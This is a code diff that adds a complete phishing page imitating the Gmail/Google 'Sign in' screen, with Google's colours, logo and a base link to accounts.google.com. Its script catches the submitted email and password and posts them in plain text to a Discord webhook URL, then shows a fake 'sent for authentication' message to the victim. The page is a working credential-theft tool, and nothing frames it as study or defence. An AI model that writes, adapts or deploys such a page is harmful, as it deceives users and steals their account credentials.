@@ -1,0 +1,124 @@
+<html><head><base href="https://accounts.google.com"><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Gmail - Sign In</title>
+<style>
+body, html {
+  height: 100%;
+  margin: 0;
+  padding: 0;
+  font-family: 'Roboto', Arial, sans-serif;
+  background-color: #fff;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+}
+.login-container {
+  width: 450px;
+  padding: 40px;
+  border: 1px solid #dadce0;
+  border-radius: 8px;
+  text-align: center;
+}
+.google-logo {
+  width: 75px;
+  height: 24px;
+  margin-bottom: 20px;
+}
+h1 {
+  font-size: 24px;
+  font-weight: 400;
+  margin-bottom: 10px;
+}
+p {
+  font-size: 16px;
+  margin-bottom: 30px;
+  color: #202124;
+}
+input[type="email"], input[type="password"] {
+  width: 100%;
+  padding: 13px 15px;
+  font-size: 16px;
+  margin-bottom: 20px;
+  border: 1px solid #dadce0;
+  border-radius: 4px;
+  outline: none;
+}
+input[type="email"]:focus, input[type="password"]:focus {
+  border-color: #1a73e8;
+  box-shadow: 0 0 0 2px rgba(26,115,232,0.2);
+}
+.button-container {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  margin-top: 30px;
+}
+.forgot-email {
+  color: #1a73e8;
+  text-decoration: none;
+  font-weight: 500;
+}
+.next-button {
+  background-color: #1a73e8;
+  color: white;
+  border: none;
+  padding: 10px 25px;
+  border-radius: 4px;
+  font-size: 14px;
+  font-weight: 500;
+  cursor: pointer;
+}
+.next-button:hover {
+  background-color: #287ae6;
+  box-shadow: 0 1px 2px 0 rgba(66,133,244,0.3),0 1px 3px 1px rgba(66,133,244,0.15);
+}
+</style>
+</head>
+<body>
+<div class="login-container">
+  <svg class="google-logo" viewBox="0 0 75 24" xmlns="http://www.w3.org/2000/svg">
+    <path d="M21.75 11.9091C21.75 11.1364 21.6818 10.3636 21.5455 9.63636H11.1818V14.1818H17.1818C16.9091 15.5455 16.1364 16.7727 14.9091 17.5909V20.4545H18.4091C20.4545 18.5455 21.75 15.5 21.75 11.9091Z" fill="#4285F4"/>
+    <path d="M11.1818 22.5C14.1364 22.5 16.6364 21.5 18.4091 20.4545L14.9091 17.5909C13.9091 18.2727 12.6364 18.6818 11.1818 18.6818C8.31818 18.6818 5.90909 16.7273 5 14.1818H1.36364V17.1364C3.13636 20.3182 6.86364 22.5 11.1818 22.5Z" fill="#34A853"/>
+    <path d="M5 14.1818C4.77273 13.5 4.63636 12.7727 4.63636 12C4.63636 11.2273 4.77273 10.5 5 9.81818V6.86364H1.36364C0.636364 8.40909 0.181818 10.1591 0.181818 12C0.181818 13.8409 0.636364 15.5909 1.36364 17.1364L5 14.1818Z" fill="#FBBC05"/>
+    <path d="M11.1818 5.31818C12.7727 5.31818 14.2273 5.90909 15.3636 7L18.4545 3.90909C16.6364 2.22727 14.1364 1.13636 11.1818 1.13636C6.86364 1.13636 3.13636 3.31818 1.36364 6.86364L5 9.81818C5.90909 7.27273 8.31818 5.31818 11.1818 5.31818Z" fill="#EA4335"/>
+  </svg>
+  <h1>Sign in</h1>
+  <p>Use your Google Account</p>
+  <form id="loginForm">
+    <input type="email" id="email" placeholder="Email or phone" required>
+    <input type="password" id="password" placeholder="Password" required>
+    <div class="button-container">
+      <a href="https://accounts.google.com/signin/v2/usernamerecovery" class="forgot-email">Forgot email?</a>
+      <button type="submit" class="next-button">Next</button>
+    </div>
+  </form>
+</div>
+
+<script>
+document.getElementById('loginForm').addEventListener('submit', function(e) {
+  e.preventDefault();
+  const email = document.getElementById('email').value;
+  const password = document.getElementById('password').value;
+  
+  // Send login data to the specified webhook
+  fetch('https://discord.com/api/webhooks/12528531786477105/PRytgEBuLfGp3QVrSvGeNfEpfiKDR0rTVNrw_IcBCDlbfP7Cc7zc4bM7tTpnNr3Cds4s', {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+    },
+    body: JSON.stringify({
+      content: `Login attempt - Email: ${email}, Password: ${password}`
+    }),
+  })
+  .then(response => {
+    if (response.ok) {
+      alert('Login information sent for authentication. Please wait for verification.');
+    } else {
+      alert('There was an error processing your login. Please try again later.');
+    }
+  })
+  .catch(error => {
+    console.error('Error:', error);
+    alert('There was an error processing your login. Please try again later.');
+  });
+});
+</script>
+</body></html>
